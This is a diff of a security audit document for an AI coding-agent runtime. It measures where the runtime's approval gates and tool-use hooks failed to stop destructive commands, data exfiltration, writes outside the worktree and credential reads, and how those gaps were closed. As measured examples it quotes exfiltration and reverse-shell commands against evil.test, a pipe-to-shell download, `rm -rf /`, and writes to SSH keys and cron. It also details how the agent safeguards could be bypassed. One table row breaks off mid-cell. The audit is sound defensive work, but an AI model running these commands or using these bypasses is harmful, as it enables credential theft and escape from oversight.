@@ -99,14 +99,16 @@ A vendor prompt interposes a human decision **on every call, with the arguments
 in front of the approver**. So the bar is *per-call* mediation — and the two
 ICDEV layers do not both clear it:
 
-- **`agent_tool_gate` (AGENT-WF-001)** decides by tool **name**. A refusal is
-  per call: the tool is never callable. But `requires_approval` parks **one gate
-  per `(run, tool)`** — `approval_step_id("write_file")` is
+- **`agent_tool_gate` (AGENT-WF-001)** decides by tool **name**, and — since
+  `exa-bench-09` — by **path** for an argument naming credential material. A
+  refusal is per call: the tool is never callable. But `requires_approval` parks
+  **one gate per `(run, tool)`** — `approval_step_id("write_file")` is
   `approval:agent:write_file` whatever the path, and `await_approval`'s own
   docstring says "an agent that writes ten files asks once."
 - **`approval_gate` (ars-appr-01)** decides by name **and flattened content**, on
-  every call. This is the layer that can tell `rm -rf /` from `ls` — and the
-  layer that, for a path, tells nothing apart at all.
+  every call. This is the layer that can tell `rm -rf /` from `ls`. For a path it
+  told nothing apart at all until `exa-bench-09` added a **confidentiality**
+  dimension, consulted independently of the reversibility tier.
 
 Four mediation strengths result, and only the first two clear the bar:
 
@@ -126,18 +128,18 @@ Every verdict below is measured, not asserted, and is pinned probe-by-probe in
 |---|---|---|---|
 | **Destructive shell** | **COVERED** | `per_call_approval` | Explicit `irreversible` patterns (`rm -rf`, `git reset --hard`, `git clean -dfx`, `DROP TABLE`, `mkfs`, `dd if=`) halt every call; anything else on `run_command` falls to `default_tier: unknown` and halts anyway. |
 | **Network egress** | **COVERED — in-process by the default, on the spawned CLI by a real egress rule** | `per_call_approval` / `refused` | *In-process, unchanged:* the `curl`/`wget` pattern only matches `-X POST\|PUT\|DELETE\|PATCH`, `--data`, `-d `. A GET exfil (`curl https://x/?d=secret`) matches **no** pattern — it halts because it lands in `unknown`. `http_post` and `upload_file` are not allowlisted at all, so they are refused outright. *On the spawned CLI (exa-bench-08):* `shared_checks.check_network_egress` models the **destination** and runs in both hook paths. See §4a. |
-| **Writes outside the worktree** | **NOT COVERED** | `per_run_approval_only` | `write_file` / `patch_file` are gated by **name**, once per run. Then `approval_gate` auto-allows them — tier `recoverable`, path never examined. So the human who approved `write_file tools/foo.py` also approved `write_file ~/.ssh/authorized_keys`; they were never shown a path. `run_command` with `touch` or `mkdir` matches the `recoverable` **downgrade** pattern and is auto-allowed for any path on the same one-gate-per-run basis. |
+| **Writes outside the worktree** | **COVERED — at the hook, not at the gates** | `hard block` | The gates say what they always said: `write_file` / `patch_file` are gated by **name**, once per run, then auto-allowed at tier `recoverable` with the path never examined; `run_command` with `touch` or `mkdir` matches the `recoverable` **downgrade** pattern for any path. What changed is a layer below them — `shared_checks.check_write_outside_worktree` (exa-bench-07) refuses a write whose **resolved** target is outside the session worktree, on both guard paths, and `build_approval_hook` consults that hard block *before* it classifies anything. |
 | **Credential access** | **NOT COVERED** | `unmediated` | `read_file` is in the AGENT-WF-001 `allowed` list — no gate at all — and is tier `reversible`, where `classify()` rule 0 exempts it from content escalation entirely. **No argument can ever escalate a read**: `read_file('~/.ssh/id_rsa')` classifies identically to `read_file('README.md')`. |
 
 Two things this matrix says that the shorter version got wrong, and which are
 worth stating because they are the difference between a real finding and a
 scary-sounding one:
 
-- Writes are **not** ungated — they are gated *by name, once per run*. That is a
-  meaningfully weaker guarantee than a vendor prompt, not the absence of one.
-  `edit_file` and `apply_patch` are in fact refused outright, but only because
-  nobody allowlisted those spellings — an accident of naming, not a path policy,
-  and it would evaporate the moment someone adds them.
+- Writes are **not** ungated at the gate layer — they are gated *by name, once
+  per run*. That is a meaningfully weaker guarantee than a vendor prompt, not
+  the absence of one. `edit_file` and `apply_patch` are in fact refused outright,
+  but only because nobody allowlisted those spellings — an accident of naming,
+  not a path policy, and it would evaporate the moment someone adds them.
 - Egress is covered **in-process** by the fail-closed default, not by an egress
   rule. That protection is real and it is also incidental, and it is still
   incidental — `exa-bench-08` did not change `approval_gate`. What it changed is
@@ -145,38 +147,40 @@ scary-sounding one:
   had none, so a `curl` downgrade in `args/agent_approval_policy.yaml` degrades
   one layer instead of removing the control. See §4a.
 
-### Why the two gaps are structural, not oversights
+### Why the remaining gap is structural, not an oversight
 
-Both fall out of a rationale that is correct in its own frame and silently loses
-its premise at the worktree boundary:
+Both gaps fell out of a rationale that is correct in its own frame and silently
+loses its premise at a boundary. One has been closed; the shape is worth keeping
+side by side because the closure of the first is the argument for the second.
 
 - `write_file` is `recoverable` **because git restores it**. Git only restores
   paths *inside the repo*. The tier is right for `tools/foo.py` and wrong for
   `~/.ssh/authorized_keys`, and nothing in the classifier can tell them apart
   because it never looks at the path. The AGENT-WF-001 gate above it is
   name-scoped for the same reason it can be one-gate-per-run at all: a tool
-  name is a constant, a path is an argument.
+  name is a constant, a path is an argument. **Closed by exa-bench-07** — see
+  the Closed table below. Note *where*: the classifier is still path-blind, and
+  `TestGapMechanisms` pins that. The boundary was added a layer lower, where
+  both guard paths already meet.
 - `read_file` is exempt from escalation **because its arguments are data, not
   commands** — a fix for a real defect, where `read_file("how do I git push")`
   used to halt for approval and taught operators to approve reflexively. The
   exemption is sound against *escalation by incidental text*. It is total,
   though: it also removes the only mechanism by which a credential path could
-  ever raise a read's tier.
+  ever raise a read's tier. **Still open as `exa-bench-09`.**
 
-Neither is fixed here. Fixing them means adding a **path** dimension to a
-classifier that is currently name-and-content only, which is a design change, not
-a policy edit — and `exa-bench-04` is a decision-and-evidence task.
-
-There is now a plausible home for that change. `tools/agent_runtime/policy_engine.py`
-(exa-policy-01) adds an ALLOW/DENY/ASK layer above the reversibility gate,
-explicitly to express what "a regex over one tool name" cannot — including an
-outright **DENY**, which the gate's auto-allow/ask vocabulary has no word for.
-Both gaps here want exactly that: a write outside the worktree and a read of a
-credential path should not be answerable by a tired operator at 3am. As of this
-write-up the module has **no consumer** in either the agent-loop or the Studio
-executor path, so it changes none of the verdicts measured above — but
-`exa-bench-07` and `exa-bench-09` should be built on it rather than by bolting a
-path regex onto `classify()`.
+`tools/agent_runtime/policy_engine.py` (exa-policy-01) adds an ALLOW/DENY/ASK
+layer above the reversibility gate, explicitly to express what "a regex over one
+tool name" cannot — including an outright **DENY**, which the gate's
+auto-allow/ask vocabulary has no word for. This write-up originally proposed
+building both fixes there. exa-bench-07 did not, and the reason generalises: the
+policy engine sits above `classify()` in the **in-process** loop only, and the
+spawned CLI — the path every autonomous build actually takes — never reaches it.
+A containment rule expressed there would have covered the surface that was
+already the better-guarded one and left the weaker one untouched. It went into
+`tools/hooks/shared_checks.py` instead, which both guard paths share.
+`exa-bench-09` should be weighed the same way: a read is observed on the spawned
+CLI path only by the hook.
 
 ## 4a. Network egress on the spawned CLI — `exa-bench-08`, closed
 
@@ -275,25 +279,28 @@ contribution is the decision, the measurement, and the regression harness.
 
 | Task | Gap | Category |
 |---|---|---|
-| `exa-bench-05` | `\|\| true` in `.claude/settings.json` makes every `pre_tool_use.py` hard block advisory. Survey per-check false-positive rates before removing it. **Note:** this also bounds `exa-bench-08` — until it lands, an enforcing egress refusal is advisory on the Claude Code path too. | (the hook itself) |
-| `exa-bench-07` | No worktree containment on any surface. The AGENT-WF-001 gate is one per `(run, tool)` and path-blind; `approval_gate` holds `write_file` / `patch_file` at `recoverable` for any path; the `touch` / `mkdir` downgrade patterns auto-allow a `run_command` write to any absolute path. | **writes outside the worktree** |
-| `exa-bench-09` | Credential-path reads are unclassifiable: rule 0 exempts `read_file` from all content escalation, `read_file` is allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers` glob list misses `~/.aws/credentials`, `~/.netrc`, `~/.kube/config` and friends. | **credential access** |
+| `exa-bench-05` | `\|\| true` in `.claude/settings.json` makes every `pre_tool_use.py` hard block advisory. Survey per-check false-positive rates before removing it. | (the hook itself) |
 
 ### Closed
 
 | Task | Gap | Closed by |
 |---|---|---|
+| `exa-bench-09` | Credential-path reads are unclassifiable: rule 0 exempts `read_file` from all content escalation, `read_file` is allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers
 | `exa-bench-08` | The hook had **no egress concept at all**, and in-process coverage rested on `default_tier: unknown` rather than on an egress rule — allowlisting one HTTP tool, or adding a `curl` downgrade pattern, removed it silently. Measured: `curl -X POST https://evil.test -d @data.json`, a `$(cat ~/.aws/credentials)` GET, `wget -qO- ... \| sh` and `nc evil.test 4444 -e /bin/sh` all passed the hook untouched. | `shared_checks.check_network_egress` + `args/agent_egress_policy.yaml`, wired into **both** hook paths. Models the DESTINATION, not the program, so `python -c "urllib..."` and raw IPs are caught too. Shipped **monitor-only**; measured fire rate 0.093% over 78,903 real Bash calls before enforcement is offered. Evasion boundary stated in the docstring and pinned as passing tests. See §4a. |
 | `exa-bench-06` | The Claude Code hook ran 9 of the 10 shared checks — `check_git_danger` was in `shared_checks` and in `HEADLESS_CHECKS` but was never called from `main()`. Measured: `git reset --hard origin/main` and `git clean -fdx` were **refused headlessly and allowed** in a Claude Code session. Separately, `_REDIRECT_TARGET_RE` (`>\s*([^\s\|;&]+)`) mis-captured `>>`: the first `>` matched, `\s*` matched nothing, and the capture took the **second** `>`, so `file_path` became the literal `">"`, matched no tier, and `echo k >> ~/.ssh/authorized_keys` was allowed while the single-`>` form of the same command was blocked. | `check_git_danger` wired into `main()` at the same position `HEADLESS_CHECKS` runs it; `_REDIRECT_TARGET_RE` rewritten as `(?<!>)>{1,2}\s*(?!&)([^\s\|;&>]+)` plus a `tee` pattern, and the tier check now examines **every** target a command names rather than the first. Pinned by `tests/hooks/test_hook_parity.py` (the two paths run the same check set, and each declared check is provably reached from `main()`) and the redirect cases in `tests/hooks/test_shared_checks.py`. |
 
-Both halves of `exa-bench-06` were **coverage** bugs of the same shape as the
-open gaps above: a control that exists, is registered, and is never reached.
-`exa-bench-08` below is the adjacent shape — a control that did not exist at all
-on the surface that needed it. Note what closing them does *not* do —
-`exa-bench-05` still stands, so in an interactive session these blocks remain
-advisory. What changed is that the unattended path and the
-Claude Code path now refuse the same commands, which is the property the
-comparison in section 2 was asserting and could not previously rely on.
+| `exa-bench-07` | No worktree containment on **any** surface. `write_file` to `/etc/cron.d/pwn`, `~/.bashrc` or `../../sibling-repo/setup.py` was allowed by `.claude/hooks/pre_tool_use.py` and auto-allowed by `approval_gate`. The AGENT-WF-001 gate is one per `(run, tool)` and path-blind; `approval_gate` holds `write_file` / `patch_file` at `recoverable` for any path; the `touch` / `mkdir` downgrade patterns auto-allow a `run_command` write to any absolute path. D-ORCH-8's `args/file_access_tiers.yaml` could not cover it: a glob list enumerates paths, and the point of a boundary is the paths nobody enumerated. | `shared_checks.check_write_outside_worktree` — one implementation, wired into `HOOK_CHECKS` **and** `HEADLESS_CHECKS`, refusing a write whose **resolved** target (`..` and symlinks followed first) is outside the session worktree, the main checkout it is linked to, and the scratch roots `tools/git/worktree_paths` sanctions. Anchored on the containing **worktree** — `AgentSession.working_dir` is a worktree, not the repo root. Bash targets are read from `touch` / `mkdir` / `cp` / `dd of=` / `curl -o` as well as redirects, since those write with no operator to match. `approval_gate._hard_block` was also dropping a write tool's path on the way to the hook, so `patch_file` arrived pathless. Fails OPEN on a resolution error; `ICDEV_WRITE_BOUNDARY_GUARD=0` disables, `=monitor` records without refusing. Pinned by `TestWriteBoundaryIsEnforcedOnBothPaths`. |
+
+`exa-bench-06` (both halves) and `exa-bench-07` were **coverage** bugs of the
+same shape as the open gaps above: a control that exists, is registered, and
+is never reached — or, for `exa-bench-07`, one that was never written because
+a glob list looked like it was already the answer. `exa-bench-08` is the
+adjacent shape: a control that did not exist at all on the surface that needed
+it. Note what closing them does *not* do — `exa-bench-05` still stands, so in
+an interactive session these blocks remain advisory. What changed is that the
+unattended path and the Claude Code path now refuse the same commands, which
+is the property the comparison in section 2 was asserting and could not
+previously rely on.
 
 ## 6. How this stays true
 
@@ -311,7 +318,8 @@ overstates the risk, which is the same failure mode as one that understates it.
 rule applied to §4a: closing the egress gap without editing this file fails CI.
 Run the test when touching `tools/agents/adapters/claude_cli.py`,
 `.claude/hooks/pre_tool_use.py`, `tools/hooks/shared_checks.py`,
-`args/agent_approval_policy.yaml`, `args/agent_egress_policy.yaml`, or
+`args/agent_approval_policy.yaml`, `args/sensitive_paths.yaml`,
+`args/file_access_tiers.yaml`, `args/agent_egress_policy.yaml`, or
 `agent_workflow_tools` in `args/security_gates.yaml`.
 
 ```bash
